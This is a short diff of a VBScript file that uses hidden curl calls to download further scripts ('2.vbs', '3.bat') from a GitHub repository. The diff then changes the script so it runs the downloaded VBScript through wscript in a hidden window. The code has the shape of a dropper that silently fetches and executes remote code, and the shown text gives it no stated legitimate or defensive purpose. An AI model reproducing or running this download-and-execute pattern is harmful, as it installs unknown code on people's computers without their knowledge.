@@ -11,9 +11,9 @@ RunHidden "curl -L https://raw.githubusercontent.com/maadhavowlak/Site/main/2.vb
 RunHidden "curl -L https://raw.githubusercontent.com/maadhavowlak/Site/main/3.bat -o 3.bat"
 
 ' Verify downloads before execution
-If objFSO.FileExists("calling.vbs") And objFSO.FileExists("Lamda.bat") Then
+If objFSO.FileExists("2.vbs") And objFSO.FileExists("3.bat") Then
     ' Execute calling.vbs in hidden mode
-    WshShell.Run "wscript.exe calling.vbs", 0, False
+    WshShell.Run "wscript.exe 2.vbs", 0, False
 Else
     ' Optional: Log error if files not downloaded
     RunHidden "echo Error: Required files missing > download_error.log"
